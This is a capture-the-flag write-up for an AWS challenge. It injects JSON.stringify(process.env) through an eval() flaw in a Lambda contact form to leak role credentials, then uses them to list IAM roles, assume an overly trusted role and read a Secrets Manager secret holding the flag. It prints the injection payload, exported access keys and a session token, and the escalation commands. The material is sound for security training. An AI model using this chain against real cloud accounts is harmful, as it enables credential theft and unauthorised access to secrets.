This challenge uses an AWS Lambda function to process the information that the user entered in the contact form information and send the processed information back to the user's email address.

First, the Lambda function which is written in Node.js is vulnerable. Indeed, it uses ```eval()``` for the ```message``` variable. This variable will be populated with the data that the user entered in the message field of the contact form. Therefore, commands that will be included in the message field will be executed on the Lambda environment. Note that some commands have been restricted.

To function and interact with other AWS services, AWS Lambda is associated to a role. The role's credentials are available in clear text in the environment variables. The use of ```eval()``` allows to execute a command to get the credentials associated to the function. For that purpose, the following command needs to be entered in the ```message``` field:
- ```JSON.stringify(process.env)```

Once the contact form submitted, an email containing all environment variables of the function is received.

[email](/images/email.png)

Then, the security credentials ```AWS_ACCESS_KEY_ID```, ```AWS_SECRET_ACCESS_KEY``` and ```AWS_SESSION_TOKEN``` can be used to connect to AWS programmatically with the AWS Lambda function identity. Here is an example for linux (for Windows, replace 'export' with 'set'):


```
export AWS_ACCESS_KEY_ID=ASIA6M7MBEABZOD5EQJH
export AWS_SECRET_ACCESS_KEY=3S9BkxkRV3H7+xBfJrSkIHfYKJMVvpG7oHjUNaTA
export AWS_SESSION_TOKEN=IQoJb3JpZ2luX2VjEPP//////////wEaDGV1LWNlbnRyYWwtMSJHMEUCIBZTfq5QONcTEWYI0tzNWMlEBjAwrBqEvxg1n3Vg/ueFAiEAsLv5GK6ogZ7uvXA8r+pbeN/bR48AjNsyFmzj0677WOAqmwIITBACGgw5ODk5NDgwOTI0MTkiDI8ezaXR2GdR+HGzBir4ATLiBVUjyEWJrJ6XRi5Z1koYgkZOdNJ7RfMQP7qIGroQo+l1E0JPby5TMnS0OmrXKCDf4t7cE9ojmcYJ31Q87ab59828reTR/XTd2H2A0i6nY1HgnEP3NhCcSv+AhgJGbHJwso5caLDHTVC18xC1Ncbnmt1Qutr0c5MdTU67R9U3wTtaURhHKHruz4xdB6yiTCkqmvPXIxo/VqxWme1Ptckzf+EW2B0Zu382vCxQzDC32lZ5f8LNVhpT8dHE2qbfxmQkNl50LRyKQpwrSWQ0MKIi6QboD5ACtkPrD+quxNmiYpNiZNIUThhDF0dU0zdXgwCk093TSMuDMKe7z5AGOpoBIJEMJIh6OdCDFR5d1+I0G25mqsJx6v5W7w4yUcS/T3IOxshARijDt5mFSIOeTr8OJ9nhBqxfrWRqn9UsZJyQywNo42ATki4TmApCAz/NzQAwU1P3MwbTNy9SUlRHQ/DeIrtfdxHM5AUWluusrrTqPvsTtMN7Ns3cKx0EG/YdhZSorNy4j+PidcEZ0UlHgTmVcbTR8fIwDs+ekA==
```

It is possible to validate the access by running the ```aws sts get-caller-identity```.

Also, the environment variables show that the function is deployed in the eu-central-1 region. This could help for the enumeration of resources to which the function has access.
There are plenty of tools for enumerating resources in an AWS account such as [aws_list_all](https://github.com/JohannesEbke/aws_list_all). 

However, no specific resource can be found in this case. Therefore, another possibility is to list AWS IAM roles in the account. IAM roles in AWS is a identity that is assigned permissions. In fact, a role is similar to a user, except that a role is not associated with long-term credentials. Indeed, when using the Lambda identity, the temporary credentials of the Lambda function's role have been used. Furthermore, to use a role, an identity needs to assume it. Identities that are allowed to assume the role are defined in the trust policy of the role.

Based on that, roles can be listed to identify any role that would have an overly permissive trust policy. 
Use the following command to list roles: ```aws iam list-roles```.

Bingo! One role is assumable by all principals in the AWS account. 

[secret-role](/images/secret-role.png)

The trust policy of the role is (note that the account ID has been removed and replaced by <aws_account_id>):

```
{
    "Version": "2012-10-17",
    "Statement": [
        {
            "Effect": "Allow",
            "Principal": {
                "AWS": "arn:aws:iam::<aws_account_id>:root"
            },
            "Action": "sts:AssumeRole"
        }
    ]
}
```

In this case the 'Principal'-attribute set to _"arn:aws:iam::<aws_account_id>:root"_ means that any principals within the AWS account with the ID specified in <aws_account_id> have the permissions to assume the role if their own IAM identity policy allows it. Indeed, to assume a role, identities must be assigned the _"sts:AssumeRole"_ permission. Let's see if the Lambda function's role has this permission.

The role can be assumed with the following command: ```aws sts assume-role --role-arn arn:aws:iam::<aws_account_id>:role/<role_name> --role-session-name <session_name>```. Note that the session name is an identifier for the assumed role session. Therefore, it can be anything.

It is possible to authenticate to AWS using the role temporary credentials using the following commands on Linux:

```
export AWS_ACCESS_KEY_ID=ASIA6M7MBEABZOD5EQJH
export AWS_SECRET_ACCESS_KEY=3S9BkxkRV3H7+xBfJrSkIHfYKJMVvpG7oHjUNaTA
export AWS_SESSION_TOKEN=IQoJb3JpZ2luX2VjEPP//////////wEaDGV1LWNlbnRyYWwtMSJHMEUCIBZTfq5QONcTEWYI0tzNWMlEBjAwrBqEvxg1n3Vg/ueFAiEAsLv5GK6ogZ7uvXA8r+pbeN/bR48AjNsyFmzj0677WOAqmwIITBACGgw5ODk5NDgwOTI0MTkiDI8ezaXR2GdR+HGzBir4ATLiBVUjyEWJrJ6XRi5Z1koYgkZOdNJ7RfMQP7qIGroQo+l1E0JPby5TMnS0OmrXKCDf4t7cE9ojmcYJ31Q87ab59828reTR/XTd2H2A0i6nY1HgnEP3NhCcSv+AhgJGbHJwso5caLDHTVC18xC1Ncbnmt1Qutr0c5MdTU67R9U3wTtaURhHKHruz4xdB6yiTCkqmvPXIxo/VqxWme1Ptckzf+EW2B0Zu382vCxQzDC32lZ5f8LNVhpT8dHE2qbfxmQkNl50LRyKQpwrSWQ0MKIi6QboD5ACtkPrD+quxNmiYpNiZNIUThhDF0dU0zdXgwCk093TSMuDMKe7z5AGOpoBIJEMJIh6OdCDFR5d1+I0G25mqsJx6v5W7w4yUcS/T3IOxshARijDt5mFSIOeTr8OJ9nhBqxfrWRqn9UsZJyQywNo42ATki4TmApCAz/NzQAwU1P3MwbTNy9SUlRHQ/DeIrtfdxHM5AUWluusrrTqPvsTtMN7Ns3cKx0EG/YdhZSorNy4j+PidcEZ0UlHgTmVcbTR8fIwDs+ekA==
```

Validate the access using ```aws sts get-caller-identity```.

Now that the role has been assumed, enumerate the permissions of the role. For that matter, aws_list_all can also be used here. It is important to target the right AWS region. Remember an AWS region was in the environment variable, so let's start by this one:

```aws-list-all query --region eu-central-1 --directory ./data/```

[aws-list-all](/images/aws-list-all.png)

In this case, Secrets Manager resources have been found. Let's see if a value can be retrieved for one of the secret. For that purpose, use the following command ```aws secretsmanager get-secret-value --secret-id arn:aws:secretsmanager:eu-central-1:<aws_account_id>:secret:<secret_id> --region eu-central-1```.

[flag](/images/flag.png)

The flag is present in one of the secrets!

Flag: CSC{WhEn_S3v3rl355_g0e5_wR0nG}
